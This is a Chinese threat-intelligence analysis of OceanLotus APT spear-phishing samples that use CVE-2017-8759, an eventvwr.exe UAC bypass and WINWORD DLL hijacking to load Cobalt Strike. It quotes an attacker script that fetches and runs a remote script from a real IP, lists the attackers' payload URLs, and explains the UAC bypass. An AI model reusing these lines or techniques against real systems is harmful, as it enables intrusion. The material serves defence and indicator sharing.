> 原文链接: https://www.anquanke.com//post/id/88068 


# 海莲花（OceanLotus）团伙漏洞利用类攻击样本分析


                                阅读量   
                                **750704**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p3.ssl.qhimg.com/t0124cb53caa9947aee.png)](https://p3.ssl.qhimg.com/t0124cb53caa9947aee.png)

作者：360天眼实验室

投稿方式：发送邮件至linwei#360.cn，或登录网页版在线投稿



## 引言

360威胁情报中心自在2015年首次揭露海莲花（OceanLotus）APT团伙的活动以后，一直密切监控其活动，跟踪其攻击手法和目标的变化。近期被公开的团伙所执行的大规模水坑攻击中，360威胁情报中心发现超过100个国内的网站被秘密控制植入了恶意链接，团伙会在到访水坑网站的用户中选择感兴趣的目标通过诱使其下载执行恶意程序获取控制，此类攻击手法在360威胁情报中心的之前分析中已经有过介绍，详情请访问情报中心的官方Blog： [http://ti.360.net/blog/](http://ti.360.net/blog/) 。



除了水坑方式的渗透，海莲花团伙也在并行地采用鱼叉邮件的恶意代码投递，执行更加针对性的攻击。360安全监测与响应中心在所服务用户的配合下，大量鱼叉邮件被发现并确认，显示其尽可能多地获取控制的攻击风格。除了通常的可执行程序附件Payload以外，360威胁情报中心近期还发现了利用CVE-2017-8759漏洞和Office Word机制的鱼叉邮件。这类漏洞利用类的恶意代码集成了一些以前所未见的技术，360威胁情报中心在本文中详述其中的技术细节，与安全社区共享以期从整体上提升针对性的防御。



## 样本分析

海莲花团伙会收集所攻击组织机构对外公布的邮箱，只要有获得渗透机会的可能，就向其投递各类恶意邮件，360威胁情报中心甚至在同一个用户的邮箱中发现两类不同的鱼叉邮件，但所欲达到的目的是一样的：获取初始的恶意代码执行。下面我们剖析其中的两类：CVE-2017-8759漏洞和Office Word DLL劫持漏洞的利用。

### CVE-2017-8759漏洞利用样本

我们分析的第一个样本来自鱼叉邮件。邮件主题跟该员工的薪酬信息相关，其中附带了一个DOC文档类型的附件，附件名为 “请查收8月和9月的工资单.doc ”。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01bae54aca8683267e.png)

打开文件会发现其并没有内容，而只是显示了一个空白框和一张模糊不清的图片，显然这是一种企图引诱用户点击打开漏洞文档，然后通过漏洞在系统后台运行恶意代码的社会工程学攻击。

[![](https://p4.ssl.qhimg.com/t0161272fe5857964d7.png)](https://p4.ssl.qhimg.com/t0161272fe5857964d7.png)

点击空白框可以发现其是一个链接对象，链接地址如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01add571e2541a36f3.png)

注意到soap:wsdl=****这个是CVE-2017-8759漏洞利用的必要元素， 以下我们简单回顾一下CVE-2017-8759漏洞的细节。

#### CVE-2017-8759漏洞简介

CVE-2017-8759是一个.NET Framework漏洞，成因在于.NET库中的SOAP WSDL解析模块IsValidUrl函数没有正确处理包含回车换行符的情况，导致调用者函数PrintClientProxy发生代码注入，在后续过的过程中所注入的恶意代码得到执行。



漏洞利用导致代码执行的流程如下：

前述所分析的样本中包含“soap:wsdl=http://www.hkbytes.info:80/resource/image.jpg”，这里的soap:wsdl标记了接下来要使用的Moniker为Soap Moniker。

在注册表项HKEY_CLASSES_ROOT\soap中可以找到Soap Moniker的CLSID和文件路径分别为CLSID：`{`ecabb0c7-7f19-11d2-978e-0000f8757e2a`}`和Path: %systemroot%\system32\comsvcs.dll。



可以看到漏洞触发前的部分堆栈如下：

[![](https://p1.ssl.qhimg.com/t01e9db3fb0d1dc5b6d.png)](https://p1.ssl.qhimg.com/t01e9db3fb0d1dc5b6d.png)

Office在绑定了CSoapMoniker并创建实例后，进入到comsvcs!CreateSoapProxy中，会创建一个System.EnterpriseServices.Internal.[ClrObjectFactory](https://msdn.microsoft.com/zh-cn/library/system.enterpriseservices.internal.clrobjectfactory.aspx)类的实例（该类在MSDN上的描述为启用客户端SOAP代理的COM组件），代码如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c44906319d918289.png)

接着调用[ClrObjectFactory](https://msdn.microsoft.com/zh-cn/library/system.enterpriseservices.internal.clrobjectfactory.aspx)类中的CreateFromWsdl()方法，该方法中会对WsdlURL进行解析，然后通过GenAssemblyFromWsdl()生成一个以URL作为名字的dll，将其load到内存中:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019223acbd8ab20029.png)

而漏洞正是出现在GenAssemblyFromWsdl()中对Wsdl解析的时候，SOAP WSDL 解析模块WsdlParser的 IsValidUrl() 函数没有正确处理可能包含的回车换行符，使调用IsVailidUrl的PrintClientProxy没能注释掉换行符之后的代码，从而导致了代码注入。相关的漏洞代码如下：

PrintClientProxy

[![](https://p3.ssl.qhimg.com/t01ac84b05232f0a75e.png)](https://p3.ssl.qhimg.com/t01ac84b05232f0a75e.png)

IsValidUrl

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a795077859e645a0.png)

调用栈大致如下：

```
System.Runtime.Remoting.MetadataServices.WsdlParser.URTComplexType.PrintClientProxy()

System.Runtime.Remoting.MetadataServices.WsdlParser.URTComplexType.PrintCSC()

System.Runtime.Remoting.MetadataServices.WsdlParser.PrintCSC()

System.Runtime.Remoting.MetadataServices.WsdlParser.StartWsdlResolution()

System.Runtime.Remoting.MetadataServices.WsdlParser.Parse()

System.Runtime.Remoting.MetadataServices.SUDSParser.Parse()

System.Runtime.Remoting.MetadataServices.MetaData.ConvertSchemaStreamToCodeSourceStream(bool, string, Stream, ArrayList, string, string)

System.EnterpriseServices.Internal.GenAssemblyFromWsdl.Generate()

System.EnterpriseServices.Internal.ClrObjectFactory.CreateFromWsdl()

…..
```

由于hxxp://www.hkbytes.info:80/resource/image.jpg已经下载不到，这里用一个POC来代替原本image.jpg中的代码来说明漏洞如何被利用：

[![](https://p0.ssl.qhimg.com/dm/1024_116_/t014af328b7ad0dfb3d.png)](https://p0.ssl.qhimg.com/dm/1024_116_/t014af328b7ad0dfb3d.png)

如上图的POC中所示，由于第二行的soap:address locaotion后面紧跟着一个换行符，经过上述的处理流程后，导致生成的Logo.cs文件内容如下，可以看到本该被注释掉的if (System.AppDomain…等代码并未被注释掉。

[![](https://p2.ssl.qhimg.com/t01205153c303f13864.png)](https://p2.ssl.qhimg.com/t01205153c303f13864.png)

回到GenAssemblyFromWsdl()函数后，调用GenAssemblyFromWsdl.Run()编译生成的Logo.cs，生成以URL命名的dll：httpswwwhkbytesinfo80resourceimagejpg.dll，并将其加载到内存中，此时被注入的代码便得以执行起来。具体到当前的POC例子，我们可以看到被注入的代码就是将前面的字符串以“?”分割成一个Array，然后调用System.Diagnostics.Process.Start()启动新进程。进程名为Array[1]（即mshta.exe），参数为Array[2]（即要下载执行的恶意载荷）。

#### 样本文档的Payload剖析

样本文件中的Payload被设置在objdata对象中，可以看到其数据是被混淆过的：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d4b842822ef13544.png)

混淆方式为把一些没有意义的字符串填充到objdata里面，比如 `{`\*\[10位随机字母]`}`，\[10位随机字母]

[![](https://p4.ssl.qhimg.com/t017f757f7d1678fcea.png)](https://p4.ssl.qhimg.com/t017f757f7d1678fcea.png)

使用正则表达式替换掉这些用于混淆的字符串，比如：

1、用 `{`\\\*\\[a-zA-Z]`{`10`}`\`}` 搜索替换 “`{`\*\enhftkpilz`}`”

2、用 \\[a-zA-Z]`{`10`}` 搜索替换 “\akyrwuwprx”

得到的结果如下：

[![](https://p4.ssl.qhimg.com/t01ab9d9625c59c21c5.png)](https://p4.ssl.qhimg.com/t01ab9d9625c59c21c5.png)

对混淆用的字串做进一步的清理，最终结果如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0117baed6a700df0d8.png)

将其转换成二进制形式后利用Office CVE-2017-8759漏洞的特征数据显现：

[![](https://p1.ssl.qhimg.com/t01e6bd82423d7d6dca.png)](https://p1.ssl.qhimg.com/t01e6bd82423d7d6dca.png)

其中的wsdl=http://www.hkbytes.info:80/resource/image.jpg 这个链接指向的文件目前已经下载不到。

#### 基于域名关联所得样本分析

上节分析看到的http://www.hkbytes.info:80/resource/image.jpg 虽然已无法下载，但后续通过基于域名的排查关联，360威胁情报中心定位到该域名下另一个还能下载得到的样本链接：http://www.hkbytes.info/logo.gif 。其中包含的Powershell恶意代码代码如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01977d62af01501d23.png)

经过6次嵌套解码后的可读代码如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_720_/t0133a09d0b8b351c35.png)

Shellcode由CobaltStrike生成，会在内存中解密加载Beacon模块，之前360威胁情报中心对此shellcode做过专门的分析，详情见：[http://bobao.360.cn/learning/detail/2875.html](http://bobao.360.cn/learning/detail/2875.html)

[![](https://p4.ssl.qhimg.com/t01113c26df8e0405a9.png)](https://p4.ssl.qhimg.com/t01113c26df8e0405a9.png)

解开配置文件后可以找到通信域名和通过管道与模块通信的名字：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011cf9d71997b3d946.png)

调试分析发现启动Powershell的父进程为eventvrw.exe：

[![](https://p2.ssl.qhimg.com/dm/1024_30_/t01a34665816a39395b.png)](https://p2.ssl.qhimg.com/dm/1024_30_/t01a34665816a39395b.png)

进程信息如下：

[![](https://p0.ssl.qhimg.com/t01c7b1461dd2f2cd61.png)](https://p0.ssl.qhimg.com/t01c7b1461dd2f2cd61.png)

检查相关的注册表项，发现被修改指向了Powershell，这是一种已知的绕过UAC的技巧，我们在下节详细介绍一下。

#### 绕过 UAC技术解析介绍

绕过Windows UAC的目的是不经系统提示用户手工确认而秘密执行特权程序，当前样本使用的绕过方式为修改一个不需要UAC就能写的注册表的项。这里所涉及的注册表项会被eventvwr.exe首先读取并运行里面的键值指定的程序，而eventvwr.exe不需要UAC权限。如下图所示该键值被修改为Powershell加载恶意代码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01217ffd4fbf4f4df6.png)

正常系统中这个注册表键值在HKCU项里是没有的，只有在HKCR下有这个注册表键值，正常的值如下：

[![](https://p1.ssl.qhimg.com/t01cc3788c5586a2631.png)](https://p1.ssl.qhimg.com/t01cc3788c5586a2631.png)

通常打开eventvwr .exe，eventvwr .exe先会到HKCU查找mscfile关联打开的方式，而这个目录下默认是没有的，这时会转到HKCR下的mscfile里去找，如找到，启动mmc.exe，因为写HKCU这个注册表键值不需要UAC，把值改成Powershell可以导致绕过UAC。

[![](https://p5.ssl.qhimg.com/t01c98586cf671f5a1e.png)](https://p5.ssl.qhimg.com/t01c98586cf671f5a1e.png)

经过验证确认为HKCU增加改注册表项并不需要UAC权限，以下为添加注册表成功的截图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01db1981e733be3667.png)

测试代码如下：

[![](https://p4.ssl.qhimg.com/t01bb90edea500744f7.png)](https://p4.ssl.qhimg.com/t01bb90edea500744f7.png)

因此通过eventvwr即可以让需要UAC执行权限的程序在运行时不会弹出UAC权限确认框，如下所示将注册表改成”海马玩”的路径：

[![](https://p3.ssl.qhimg.com/t0183ea865cd5624f1e.png)](https://p3.ssl.qhimg.com/t0183ea865cd5624f1e.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_519_/t0166703134554bb248.png)

正常海马玩运行时需要提升UAC权限：

[![](https://p3.ssl.qhimg.com/t016ef676af68e46aab.png)](https://p3.ssl.qhimg.com/t016ef676af68e46aab.png)

利用当前这个绕过方法，启动eventvwr，不需要UAC就可以打开程序：

[![](https://p2.ssl.qhimg.com/t016a458a8667d95f3d.png)](https://p2.ssl.qhimg.com/t016a458a8667d95f3d.png)

### Word DLL劫持漏洞利用样本

360安全监测与响应中心为用户处理海莲花团伙感染事件过程中，存在CVE-2017-8759漏洞利用样本的同一台机器上被发现另一个海莲花团伙的攻击样本，也是通过鱼叉邮件的方式投递：

[![](https://p1.ssl.qhimg.com/t01909c9dee1c9c80ae.png)](https://p1.ssl.qhimg.com/t01909c9dee1c9c80ae.png)

这个看起来与加薪相关的社工邮件附件利用了一种与上述CVE-2017-8759漏洞不同的恶意代码加载机制。

#### WinWord的wwlib.dll劫持

把压缩包解压以后，可以看到其中包含一个名为 “2018年加薪及任命决定征求意见表       .exe”的可执行程序，这个程序其实就是一个正常微软的WINWORD.exe 的主程序，带有微软的签名，所以其WinWord的图标也是正常的：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0100fc0f475e874e0f.png)

WINWORD.exe会默认加载同目录下的wwlib.dll，而wwlib.dll是攻击者自己的，所以本质上这还是一个DLL劫持的白利用加载恶意代码方式。

#### 恶意代码加载流程

分析显示wwlib.dll的功能就是通过COM组件调用JavaScript本地执行一个脚本，相关的代码在102资源里：

[![](https://p5.ssl.qhimg.com/dm/1024_145_/t01c27840c0e344f4e1.png)](https://p5.ssl.qhimg.com/dm/1024_145_/t01c27840c0e344f4e1.png)

其中的脚本为：

```
javascript:"\..\mshtml.dll,RunHTMLApplication ";document.write();try`{`GetObject("script:http://27.102.102.139:80/lcpd/index.jpg")`}`catch(e)`{``}`;close();
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014aeb3e6fc766b969.png)

调用COM组件执行脚本：

[![](https://p2.ssl.qhimg.com/t012edfc5b82de95dcb.png)](https://p2.ssl.qhimg.com/t012edfc5b82de95dcb.png)

执行的脚本[http://27.102.102.139:80/lcpd/index.jpg](http://27.102.102.139:80/lcpd/index.jpg) 内容如下：

[![](https://p5.ssl.qhimg.com/t010190dfb280331b2a.png)](https://p5.ssl.qhimg.com/t010190dfb280331b2a.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015b6ec5f12408436e.png)

前面的变量serialized_obj是经过base64编码后的C#程序，该脚本调用程序的LoadShell方法，在内存中加载shl变量，下图为解密后的C#程序的LoadShell方法：

[![](https://p4.ssl.qhimg.com/t0150483de1f2098f1c.png)](https://p4.ssl.qhimg.com/t0150483de1f2098f1c.png)

接下来程序会把传过来的string做base64解密在内存中加载执行，下图为解密后的string，很容易看出来这又是Cobalt Strike的Shellcode Payload：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b141d8c8fb1b54b9.png)

Shellcode会连接https://27.102.102.139/oEcE地址下载下一步攻击荷载，而oEcE就是前面分析的CobaltStrike的释放Beacon模块的Shellcode：

[![](https://p2.ssl.qhimg.com/t01a963b3c0cf2476e0.png)](https://p2.ssl.qhimg.com/t01a963b3c0cf2476e0.png)

经过和0x69异或配置文件解密出的配置文件如下：

[![](https://p2.ssl.qhimg.com/t015897f39fffef7f83.png)](https://p2.ssl.qhimg.com/t015897f39fffef7f83.png)

执行完Shellcode的同时会从资源中释放ID为102的doc文件并打开：

[![](https://p3.ssl.qhimg.com/t010f4f5ce48bb92546.png)](https://p3.ssl.qhimg.com/t010f4f5ce48bb92546.png)

[![](https://p3.ssl.qhimg.com/t01969690e1cdc1f497.png)](https://p3.ssl.qhimg.com/t01969690e1cdc1f497.png)

[![](https://p3.ssl.qhimg.com/t010a72f659b3254df1.png)](https://p3.ssl.qhimg.com/t010a72f659b3254df1.png)

打开后的界面如下以迷惑攻击对象，以为自己刚才打开的就是word文档：

[![](https://p0.ssl.qhimg.com/t014456f2c4b533ebaf.png)](https://p0.ssl.qhimg.com/t014456f2c4b533ebaf.png)

## 溯源和关联分析

通过在360威胁情报中心搜索[www.hkbytes.info](http://www.hkbytes.info)该域名，如图：

[![](https://p0.ssl.qhimg.com/dm/1024_556_/t01e3fb2f964283b0b5.png)](https://p0.ssl.qhimg.com/dm/1024_556_/t01e3fb2f964283b0b5.png)

搜索IP的结果如下：

[![](https://p3.ssl.qhimg.com/t010e04cbeb7a75729c.png)](https://p3.ssl.qhimg.com/t010e04cbeb7a75729c.png)

该域名最早看到时间是2017年9月12日，而域名注册时间为2017年1月4日，可见海莲花团伙会为将来的攻击预先储备网络资源。

[![](https://p1.ssl.qhimg.com/t0102fc7e057e15e95d.png)](https://p1.ssl.qhimg.com/t0102fc7e057e15e95d.png)

[![](https://p5.ssl.qhimg.com/t01195408b8d72cfd26.png)](https://p5.ssl.qhimg.com/t01195408b8d72cfd26.png)

## 总结

为了成功渗透目标，海莲花团伙一直在积极跟踪利用各种获取恶意代码执行及绕过传统病毒查杀体系的方法，显示团伙有充足的攻击人员和技术及网络资源储备。对于感兴趣的目标，团伙会进行反复的攻击渗透尝试，360威胁情报中心和360安全监测与响应中心所服务的客户中涉及军工、科研院所、大型企业等机构几乎都受到过团伙的攻击，那些单位对外公布的邮箱几乎都收到过鱼叉邮件，需要引起同类组织机构的高度重视。

## 参考链接

[“Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)

## IOC

[![](https://p4.ssl.qhimg.com/t010468918257850866.png)](https://p4.ssl.qhimg.com/t010468918257850866.png)
